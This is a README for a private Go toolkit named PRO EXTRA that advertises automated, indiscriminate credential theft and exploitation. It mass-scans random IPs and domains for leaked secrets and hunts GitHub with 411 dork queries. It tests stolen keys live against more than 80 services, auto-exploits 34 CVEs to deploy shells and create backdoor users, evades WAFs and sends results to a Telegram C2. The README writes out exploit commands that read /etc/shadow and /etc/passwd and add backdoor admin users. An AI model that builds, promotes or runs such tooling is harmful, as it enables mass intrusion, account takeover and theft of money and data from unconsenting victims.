<div align="center">

```
 ██████╗ ██████╗  ██████╗     ███████╗██╗  ██╗████████╗██████╗  █████╗ 
 ██╔══██╗██╔══██╗██╔═══██╗    ██╔════╝╚██╗██╔╝╚══██╔══╝██╔══██╗██╔══██╗
 ██████╔╝██████╔╝██║   ██║    █████╗   ╚███╔╝    ██║   ██████╔╝███████║
 ██╔═══╝ ██╔══██╗██║   ██║    ██╔══╝   ██╔██╗    ██║   ██╔══██╗██╔══██║
 ██║     ██║  ██║╚██████╔╝    ███████╗██╔╝ ██╗   ██║   ██║  ██║██║  ██║
 ╚═╝     ╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ By itachi3d 
```

**The Ultimate Automated Credential Extraction & Exploitation Framework** By itachi3d

<img src="https://img.shields.io/badge/Go-1.25+-00ADD8?style=flat-square&logo=go&logoColor=white" /> <img src="https://img.shields.io/badge/Windows_x64-0078D6?style=flat-square&logo=windows&logoColor=white" /> <img src="https://img.shields.io/badge/v2.1.0-FF0000?style=flat-square" /> <img src="https://img.shields.io/badge/30K+_Lines-8B5CF6?style=flat-square" /> <img src="https://img.shields.io/badge/Single_Binary-2ea44f?style=flat-square" />

</div>

---

## What Is This

```
DISCOVER  →  EXTRACT  →  VALIDATE  →  EXPLOIT  →  NOTIFY

Targets:
  • Web servers leaking .env / .git / configs / JS bundles / archives
  • Secrets committed to public GitHub / GitLab repos (411 dorks)
  • Unpatched apps (34 weaponized CVEs → auto-shell deployment)
  • Cloud metadata (AWS/GCP/Azure IAM tokens via SSRF)
  • Crypto wallets (ETH keys, BTC WIF, BIP39 seeds with balance check)

Evasion:
  • 3-layer WAF bypass (headers → path mutation → method rotation)
  • 5 real browser fingerprints rotated per request
  • Proxy pool with auto health check + round-robin

Output:
  • Only VALIDATED credentials reach Telegram (80+ APIs tested live)
  • Shells deployed on confirmed RCE. Deduped across restarts.
  • Runs for days unattended. Single binary. Zero dependencies.
```

---

## Key Stats

| Metric | Value |
|--------|-------|
| Paths scanned per domain | **120+** |
| CVEs weaponized | **34** |
| Credential validators | **80+** |
| GitHub dork queries | **411** |
| WAF bypass techniques | **36** |
| Auth bypass techniques | **40+** |
| Max threads | **5,000** |
| Total code | **30,000+ lines** |
| Dependencies | **Zero (single binary)** |

---

## Validated Services (80+)

> Every credential is tested LIVE against the real API. Dead = discarded. Working = Telegram.

| Category | Services |
|----------|----------|
| ☁️ Cloud | AWS Keys, Azure, GCP, Cloudflare, DigitalOcean, Supabase, Vault, Terraform, K8s |
| 📧 Email/SMS | SendGrid, Mailgun, Brevo, Twilio, Mailjet, Postmark, Resend, Plivo, Nexmo, SMTP |
| 🤖 AI/LLM | OpenAI, Anthropic, Groq, xAI, DeepSeek, Perplexity, Mistral, Cohere, ElevenLabs |
| 💳 Payments | Stripe, PayPal, Square |
| 🛠️ DevOps | GitHub, GitLab, Bitbucket, Slack, Discord, Telegram, Grafana, Datadog, Sentry |
| 🌐 Proxies (25) | Smartproxy, BrightData, Oxylabs, IPRoyal, SOAX, NetNut + 19 more |
| 🔍 OSINT (16) | Shodan, Censys, VirusTotal, Hunter, FOFA, ZoomEye + 10 more |
| 💰 Crypto | ETH private keys (3 chains), BTC WIF, BIP39 seeds, Solana |
| 🏠 Hosting | cPanel (API), WordPress Admin |

---

## CVE Auto-Exploitation (34)

> Fingerprint → Confirm → Exploit → Deploy shell. Fully automatic.

<details>
<summary><b>Click to see all 34 CVEs</b></summary>

| # | CVE | Target | Impact |
|---|-----|--------|--------|
| 1 | CVE-2021-3129 | Laravel Ignition | RCE + .env dump |
| 2 | CVE-2022-22965 | Spring4Shell | JSP/PHP shell |
| 3 | CVE-2024-27198 | TeamCity | Auth bypass + configs |
| 4 | CVE-2024-4040 | CrushFTP | Path traversal |
| 5 | CVE-2024-40711 | Veeam | Credential extraction |
| 6 | CVE-2024-21762 | FortiOS | SSL VPN config |
| 7 | CVE-2021-44228 | Log4Shell | JNDI + env dump |
| 8 | CVE-2017-9841 | PHPUnit | RCE + shell |
| 9 | CVE-2023-23752 | Joomla | API secrets |
| 10 | CVE-2024-23897 | Jenkins | master.key read |
| 11 | CVE-2021-43798 | Grafana | Path traversal |
| 12 | CVE-2025-29927 | Next.js | Middleware bypass |
| 13 | CVE-2024-1709 | ScreenConnect | Auth bypass + RCE |
| 14 | CVE-2024-3400 | PAN-OS | PHP bypass |
| 15 | CVE-2024-24919 | Check Point | File read |
| 16 | CVE-2024-40766 | SonicWall | VPN bypass |
| 17 | CVE-2024-8190 | Ivanti CSA | RCE |
| 18 | CVE-2024-20767 | ColdFusion | RCE |
| 19 | CVE-2024-53677 | Struts2 | OGNL injection |
| 20 | CVE-2024-4358 | Telerik | File upload |
| 21 | CVE-2024-50623 | Cleo | Groovy RCE |
| 22 | CVE-2024-28255 | OpenMetadata | Auth bypass |
| 23 | CVE-2023-22518 | Confluence | Auth bypass |
| 24 | CVE-2023-46604 | ActiveMQ | Protocol RCE |
| 25 | CVE-2025-47953 | Langflow | Shell deploy |
| 26 | CVE-2025-31324 | SAP NetWeaver | RCE |
| 27 | CVE-2025-32432 | Craft CMS | Shell deploy |
| 28 | CVE-2025-0108 | PAN-OS | PHP bypass |
| 29 | CVE-2024-4577 | PHP CGI | Arg injection |
| 30 | CVE-2017-12617 | Tomcat | PUT shell |
| 31 | CVE-2017-5638 | Struts2 | OGNL headers |
| 32 | CVE-2024-21887 | Ivanti Connect | Cmd injection |
| 33 | CVE-2024-37085 | VMware | Auth bypass |
| 34 | CVE-2024-43090 | mod_fcgid | RCE |

</details>

---

## Stealth & Evasion

| Layer | What It Does |
|-------|-------------|
| **Browser Rotation** | 5 real profiles (Chrome, Firefox, Safari, Edge, iOS) + matching headers |
| **WAF Bypass** | Header spoof (84 combos) → Path mutation (12 variants) → Method bypass (6 alt) |
| **Infrastructure** | Proxy pool + health check, round-robin, 150ms/domain, TLS CONNECT tunnel |

---

## GitHub Hunt (411 Queries)

| Feature | Details |
|---------|---------|
| **Queries** | 411 patterns: AWS, SMTP, AI, Git tokens, Slack, Crypto, CI/CD, Docker, K8s, Proxy, OSINT |
| **Token Pool** | Multi-token rotation, auto rate limit detection, pause + switch |
| **Persistence** | Progress saved per query, deduped across sessions, crash-safe resume |
| **Deep Scan** | Downloads real file content, credential regex, not just search titles |

---

## Advanced Scanning

| Module | What It Does |
|--------|-------------|
| **JS Bundles** | Downloads all script sources, scans minified code for embedded secrets |
| **Archives** | Extracts ZIP/TAR/JAR/WAR, scans internal .env/.properties/.yml/keys |
| **HeapDump** | Downloads Spring Boot HPROF, extracts passwords from JVM memory |
| **Git Packs** | Parses .idx + .pack, reconstructs full history, finds deleted credentials |
| **phpinfo()** | Extracts sensitive vars, detects PHP version, maps to CVEs |
| **SSRF/IMDS** | Tests 169.254.169.254 for AWS/GCP/Azure IAM tokens |
| **Spring Config** | Extracts property sources from exposed config server |
| **Consul KV** | Dumps key-value store secrets |
| **Elasticsearch** | Lists indices, extracts credentials from documents |
| **Docker API** | Enumerates containers, reads /proc/1/environ |
| **K8s Secrets** | Lists namespaces, reads secrets and configmaps |
| **WebDAV** | PROPFIND enumeration + NTLM detection |
| **Hadoop/Spark** | Extracts AWS keys from Hadoop XML and Spark env |

---

## Web Security Scanners

| Scanner | Capability |
|---------|-----------|
| **Admin Finder** | Discovers admin/login panels across CMS paths |
| **CORS** | Tests wildcard origins, reflected origins, credential inclusion |
| **Cookies** | Checks HttpOnly, Secure, SameSite flags |
| **Crawler** | Recursive link + JS URL discovery, configurable depth |
| **Vuln Scanner** | SQLi, XSS, LFI, SSRF detection |
| **Cred Checker** | SSH, FTP, MySQL, PostgreSQL, Redis, MongoDB testing |

---

## Domain Discovery

| Source | Method |
|--------|--------|
| **CertStream** | Real-time CT log WebSocket + keyword filter |
| **crt.sh** | Subdomain enumeration from CT logs |
| **Google Dorks** | Targeted queries for exposed configs |
| **Harvest** | 10+ OSINT sources combined |
| **IP Scanner** | AWS/GCP/Azure/DO/Vultr/Hetzner/Oracle/Alibaba/Tencent ranges |
| **Random IPs** | Generate + scan random public IPs |
| **SaaS Scoring** | Prioritize high-value targets by tech stack |
| **S3 Buckets** | Open bucket scanning (AWS, GCP, Azure, Oracle, DO) |

---

## Remote Control & Export

| Feature | Details |
|---------|---------|
| **Telegram C2** | Scan targets, receive results, upload lists, stats, shutdown — all from phone |
| **Dashboard** | Web UI on :8080 with real-time stats |
| **JSON Export** | `toolkit export-json output.json` |
| **CSV Export** | `toolkit export-csv output.csv` |
| **Retro-Send** | Re-send all results to Telegram |
| **Resume** | All progress saved, crash-safe, auto-resume |
| **Dedup** | SHA256 dedup persisted across restarts |

---

## Manual Exploit Mode

```bash
toolkit exploit --cve CVE-2017-9841 --target https://target.com --cmd "id"
toolkit exploit --cve CVE-2024-27198 --target https://target.com --add-user admin:pass
toolkit exploit --cve JENKINS-SCRIPT --target https://target.com --cmd "cat /etc/passwd"
toolkit exploit --cve CVE-2024-24919 --target https://target.com --file /etc/shadow
```

| Flag | Purpose |
|------|---------|
| `--cve` | CVE to exploit |
| `--target` | Target URL |
| `--cmd` | Command to run (default: id) |
| `--add-user` | Create backdoor user |
| `--reverse-shell` | Reverse shell callback |
| `--file` | File to read from target |

---

## Quick Start

```bash
go build -ldflags="-s -w" -o toolkit.exe .

# Full scan
toolkit.exe envdump domains.txt 1000 --full --proxy-file proxies.txt

# GitHub hunt
toolkit.exe github-scan

# Interactive menu
Start_Work_Extractor.bat
```

---

## CLI Reference

```bash
# Scanning
toolkit envdump     <domains.txt> [threads] [--full] [--probe] [--verbose]
toolkit find-git    <domains.txt> [threads]
toolkit gitdump     <vulns.txt>   [threads]

# Validation
toolkit check-aws   <file> [threads]
toolkit check-smtp  <file> [threads]
toolkit check-all

# Discovery
toolkit certstream  [threads] [--auto-scan]
toolkit harvest     [threads] [--seeds=a,b]
toolkit dork        <output> [max]
toolkit ipscan      --provider aws,gcp --threads 500

# GitHub
toolkit github-scan [token_file]
toolkit gh-private  <token_or_file>
toolkit gist-scan

# Web Security
toolkit admin       <urls.txt> [threads]
toolkit cors        <urls.txt> [threads]
toolkit vuln        <urls.txt> [threads] [--types=sql,xss,lfi,ssrf]
toolkit crawl       <urls.txt> [threads] [--depth N]
toolkit exploit     --cve <CVE> --target <url>

# Dark Web
toolkit darkweb scan <domain>
toolkit darkweb breach <domain>

# Utilities
toolkit bot
toolkit dashboard
toolkit export-json [file]
toolkit export-csv  [file]
toolkit retro-send
toolkit pro
```

---

## Output Files

```
resultat/
├── aws_hits.txt            Raw AWS key pairs
├── aws_valid.txt           ✅ Confirmed working
├── aws_backdoors.txt       ✅ IAM users created
├── smtp_hits.txt           SMTP credentials
├── sendgrid_hits.txt       SendGrid keys
├── brevo_hits.txt          Brevo keys
├── twilio_hits.txt         Twilio SID:Token
├── api_keys_valid.txt      ✅ Validated API keys
├── admin_panels_valid.txt  ✅ Admin access
├── eth_keys_valid.txt      ✅ ETH with balance
├── git_hits.txt            Exposed .git repos
├── rce_verified.txt        Confirmed RCE
├── deployed.txt            Shells deployed
└── telegram_resultat.txt   Notification log
```

---

## Project Structure

| File | Role | Lines |
|------|------|------:|
| toolkit.go | CLI, Telegram bot, proxy, WAF bypass | 3,900 |
| rezandtlg.go | Core scanner, extraction, validators | 8,800 |
| verif_rce.go | 34 CVE exploits, git parsing | 3,900 |
| checkers.go | 80+ credential validators | 7,300 |
| github_scan.go | GitHub hunt, 411 queries | 2,900 |
| scanners.go | IP/S3 scanning, discovery | 2,600 |
| auth_bypass.go | 40+ bypass techniques | 350 |
| vuln_scanner.go | SQLi/XSS/LFI/SSRF | - |
| exploit.go | Manual CVE exploitation | - |
| dashboard.go | Web UI + API | 180 |

---

<div align="center">

<a href="https://t.me/Itachi3d"><img src="https://img.shields.io/badge/Telegram-@Itachi3d-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" /></a>

**"Why use 10 tools when one does it all?"**

<img src="https://img.shields.io/badge/Made_with-Go-00ADD8?style=flat-square&logo=go&logoColor=white" /> <img src="https://img.shields.io/badge/Status-Active-success?style=flat-square" /> <img src="https://img.shields.io/badge/License-Private-FF0000?style=flat-square" />

</div>
